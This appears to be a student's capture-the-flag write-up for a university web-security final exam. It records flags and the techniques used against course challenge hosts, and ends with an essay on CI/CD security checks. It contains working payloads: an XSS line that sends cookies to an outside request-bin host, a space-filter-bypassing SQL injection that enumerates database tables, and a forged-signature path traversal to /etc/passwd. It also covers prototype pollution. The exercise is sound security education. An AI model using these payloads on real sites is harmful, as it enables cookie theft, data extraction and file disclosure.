# Final

## Question 1

COMP6843FINAL{GOOD_LUCK_WITH_YOUR_EXAM.ejUzMTczMzc=.JGsTfBdr6g82V+01xtP2pA==}

Base64 decode cookie

COMP6843FINAL{ROBOTS_ROBOTS_ROBOTS}

robots.txt





/test.php - incorrect params - use same as form

GET or POST /test.php?location=admin&pin=admin -> can't use, you're not admin



## Question 2

COMP6843FINAL{REF_XSS_MORE_FILTERS_SIMPLE.ejUzMTczMzc=.oMAYY2Ulvds6hHP4Csbrmw==}

Malicious gets html-encoded, img gets encoded but image does not

`<image src=x onerror=fetch('https://enxyehmgtgkq.x.pipedream.net/'+document.cookie)>`

## Question 3



Nonce predictable: base64 decoded nonce increments by 2 each time

Try script tag with nonce in the future (doesn't work for some reason)

x-rand-protect + 2

GET request with script nonce 2 greater than current cookie



## Question 4

COMP6843FINAL{CLOSED_SOURCE_SOFTWARE_DOES_NOT_EXIST.ejUzMTczMzc=.UR/JrpACzyxG+YawrN0FaQ==}

End of source code for qos.js

COMP6843FINAL{I_LOVE_LIVE_DEBUGGING.ejUzMTczMzc=.AuWfKRQ0eAva4Fekf+pkSw==}

/debug/pprof - cookie debug = 0 to 1

COMP6843FINAL{STACK_TRACE_IS_MY_FRIEND.ejUzMTczMzc=.Xzw1oEpcgkDsDBnR/Py8lA==}

Stack dump:

```
goroutine 19 [chan receive, 1143 minutes]:
main.serve_qos_dot_quoccabank_dot_com_slash_lmaolmaolmaolmaolmaocybercybercyber()
	challenges/final/qos/main.go:67 +0x4d
```

Go to https://qos.quoccabank.com/lmaolmaolmaolmaolmaocybercybercyber to get flag

COMP6843FINAL{I_ALWAYS_PASS_SECRET_IN_CLI_ARGUMENT.ejUzMTczMzc=.1w9Ud+LVvmRNP23kGFr/Lw==}

/debug/prof/cmdline shows secret-portal-password as what_could_possibly_go_wrong

/admin mentions a super secret password -> enter to get flag

COMP6843FINAL{WHY_SEND_THAT_API_REQUEST_WHEN_I_CAN_VERIFY_PASSWORD_ON_FRONTEND.ejUzMTczMzc=.zlc2U0FqQ6CnzYbldTQq6Q==}

Search qos.js for password -> password validated on frontend

Set up debugger endpoint for comparison line, change variable a to hashed password to log in



COMP6843FINAL{CAN_WE_PORT_APP_STORE_TO_QOS_PLEASE.ejUzMTczMzc=.MywhKoz5Q20VQgMHzkdCqg==}

Images have signatures, e.g. https://qos.quoccabank.com/api/getappimage?f=handbook.png&signature=bfed56430eb40633b9de135fbb56e98f

Search qos.js for signature

```javascript
function Rd(a, b) {
    var c = Qd++,
        e = a.toLowerCase().replace(new RegExp(" ".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g, "\\$1").replace(/\x08/g, "\\x08"), "g"), "".replace(/\$/g, "$$$$")) + ".png",
        f = new Ec;
    Gc(f, e);
    Gc(f, "_this_is_my_secret_salt");
    f = Mb(Hc(f));
    return {
        id: c,
        name: a,
        image: "/api/getappimage?f=" + e + "&signature=" + f,
        Y: b
    }
```

Console:

```javascript
let forge = (filename) => {
  let signature = new Ec;
  Gc(signature, filename);
  Gc(signature, "_this_is_my_secret_salt");
  signature = Mb(Hc(signature));
  return "https://qos.quoccabank.com/api/getappimage?f=" + filename + "&signature=" + signature;
}
```

Visit link returned by forge('../etc/passwd') to retrieve flag



Course handbook

COMP6843FINAL{0a89d110-05bd-4da0-a12d-not-a-fake-but-a-real-flag.ejUzMTczMzc=.9OtpupDORw+AzhmcpgjPaQ==}

' character SQL error

https://security.stackexchange.com/questions/127655/would-removing-spaces-in-a-string-protect-against-sql-injection

NOSPACE, `/**/` BADHACKER but `/*a*/`works

Recon tables and columns

`'/*a*/union/*a*/select/*a*/table_name,column_name/*a*/from/*a*/information_schema.columns/*a*/where/*a*/table_schema/*a*/!=/*a*/'mysql'/*a*/and/*a*/table_schema/*a*/!=/*a*/'information_schema'#/*a*/`

courses (id, title), memes (meme)

`'/*a*/union/*a*/select/*a*/1,meme/*a*/from/*a*/memes#/*a*/`

one real flag, rest NOT_A_REAL_FLAG

### Tic-Tac-Toe

JS Beautify qos.js -> out of bounds string -> use burp suite to intercept ws request and input invalid board coord {"x":4,"y":4,"p":"O"}

```javascript
[ 22.646s] [com.quoccabank.qos.tictactoe] stack trace is hard so here's the source code: // rip mdn (https://twitter.com/SteveALee/status/1293487542382333952)
// did you know proto? i heard you can even inject them https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto

const readline = require("readline");
const fs = require("fs");

// did you know that like http, memcache is another TCP-based protocol?
// https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/ha-memcached-interfaces-protocol.html
const MemcacheClient = require("memcache-client");

const config = []; // TODO(adamyi): support custom configuration

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const code = fs.readFileSync(__filename);

const getLine = (function () {
  const getLineGen = (async function* () {
    for await (const line of rl) {
      yield line;
    }
  })();
  return async () => (await getLineGen.next()).value;
})();

var count = 0;
var matrix = [];
for (var i = 0; i < 3; i++) {
  matrix[i] = [null, null, null];
}

async function play() {
  try {
    var result = "d";
    for (var i = 0; i < 9; i++) {
      var req = JSON.parse(await getLine());
      if (matrix[req.x][req.y] != null) {
        result = "e";
        break;
      }
      matrix[req.x][req.y] = req.p;
      console.log(JSON.stringify({ res: "c", req: req }));
      if (
        (matrix[req.x][0] === matrix[req.x][1] &&
          matrix[req.x][1] === matrix[req.x][2]) ||
        (matrix[0][req.y] === matrix[1][req.y] &&
          matrix[1][req.y] === matrix[2][req.y]) ||
        (req.x == req.y &&
          matrix[0][0] === matrix[1][1] &&
          matrix[1][1] === matrix[2][2]) ||
        (req.x + req.y == 2 &&
          matrix[0][2] === matrix[1][1] &&
          matrix[1][1] === matrix[2][0])
      ) {
        result = req.p;
        if (i < 4) {
          // win with less than 5 steps, how is this even possible
          result = process.env.WIN5_FLAG;
        }
        if (i < 2) {
          // win with less than 3 steps, how is this even possible
          result = process.env.WIN3_FLAG;
        }
        break;
      }
    }
  } catch (err) {
    result = "e";
  }
  if (result == "e") {
    console.log(
      JSON.stringify({
        res: result,
        stacktrace: "stack trace is hard so here's the source code: " + code,
      })
    );
  } else {
    if (result != "d") {
      // increment winning count for our fancy scoreboard (it's not yet fully implemented)
      var server = "127.0.0.1:11211";
      if (config.server) {
        result =
          "weird this config function is still under development how did you set it? anyway here's a flag: " +
          process.env.CONFIG_FLAG;
        server = config.server;
      }
      // use player name (X/O) unless a dedicated scoreboard_name is specified
      var player = req.p;
      if (req.scoreboard_name) player = req.scoreboard_name;
      const client = new MemcacheClient({ server });
      try {
        // increment winning count
        await client.incr(player, 1, function (err, data) {
          result += " (win count: " + data + ")";
        });
      } catch (err) {}
    }
    console.log(
      JSON.stringify({
        res: result,
        /* advertisement: "we have a new game mode! https://qos-tictactoe.quoccabank.com/multiplayer", */ // disabled because it's still under development
      })
    );
  }
  process.exit(0);
}

play();
```

Win with less than 5 steps:

Use Burp Suite to make it X's turn only

COMP6843FINAL{I_THOUGHT_ITS_MY_TERN_BUT_OK.ejUzMTczMzc=.qTxwf4iMni9dPixUua8IRg==}



POST request with url param to https://qos-tictactoe.quoccabank.com/multiplayer

under development, only accessible via http://127.0.0.1/multiplayer/newgame

Need SSRF



Proto

COMP6843FINAL{I_HEARD_JEFF_DEAN_CAN_BEAT_YOU_AT_CONNECT_FOUR_IN_THREE_STEPS.ejUzMTczMzc=.g8EqtUvenbvoe3tFwuEIxQ==}

Win with less than 3 steps

https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/

```javascript
if (
        (matrix[req.x][0] === matrix[req.x][1] &&
          matrix[req.x][1] === matrix[req.x][2]) ||
        (matrix[0][req.y] === matrix[1][req.y] &&
          matrix[1][req.y] === matrix[2][req.y]) ||
        (req.x == req.y &&
          matrix[0][0] === matrix[1][1] &&
          matrix[1][1] === matrix[2][2]) ||
        (req.x + req.y == 2 &&
          matrix[0][2] === matrix[1][1] &&
          matrix[1][1] === matrix[2][0])
      )
```

Set req.x to `__proto__` so `matrix[__proto__]` 

```javascript
[][0] // returns undefined
[]["__proto__"] // does not
[]["__proto__"][0] // returns undefined (same if index is 0,1,2 etc.)
```





## Question 5

**You are working for a software development company building a market leading machine dog translation package. The software accepts audio inputs of dogs barking, and translates it to a suite of 12 common human languages. To achieve this, their main product is coded in Java and distributed to customers as Docker images. The code is stored in a private github repository, with a commit hook that triggers a Jenkins CI/CD build pipeline. The build pipeline performs a wide range of  performance, functionality, and security tests. If all these pass, a fresh Docker image with a complete build is automatically produced. If they fail, a failure report is produced.**

**a) Describe all of the automated security checks that you would put in the CI/CD pipeline. Be as specific as possible about technologies and how they will function to pass/fail builds.**

**b) Describe the weaknesses in these checks, i.e. how they could produce false positives and negatives.**

### Part a

Java applications are usually vulnerable due to its reliance on a large number of libraries and bundling its own dependencies, which are statically compiled instead of being dynamically linked. As such, it is possible and important to map dependencies used in the application to CVE's to check for vulnerable dependencies. Since Jenkins informs about security issues in Jenkins and Jenkins plugins, if integrated into the CI/CD pipeline, where vulnerable dependencies can raise a red flag and fail the build, allowing developers to catch vulnerabilities before the application is built and enter production. With Jenkins being an open source project under careful scrutiny with weekly security updates, as well as being a CVE Numbers Authority, security vulnerabilies are less likely to enter production as well. Furthermore, since a Docker image is generated, docker-bench-security (now renamed as Docker Bench for Security) should be used to check for vulnerabilities within the Docker image itself. For example, exposed sockets could lead to privilege escalation, leaving user systems vulnerable if attackers escape the containerised application. Adding this automation to the build pipeline ensures that best security practices for Docker are used for building the application, improving the security of the application before being released to production. Furthermore, grepstrings can be used as part of static application security testing to check for common vulnerabilities with user input and secrets management, ensuring best practices using the sources, sinks and taints notion. Again, failed pipelines will alert developers to review the application's vulnerabilities and fix them to mitigate these vulnerabilities. 

### Part b

Dependency checks:

- Metadata optional so some dependencies are not recorded (could result in false negatives) or forgot to be changes (false positive)
- Hashes for dependencies (no false positives), but JARs could be modified (false negative)

Grep strings:

- May not capture all vulnerabilities - only certain common ones (potential false sense of security)
- May have false positives due to regex

Docker checks:

- May not capture all vulnerabilities - only certain common ones (potential false sense of security) - not an exhaustive test
- Could be time-consuming for build process



















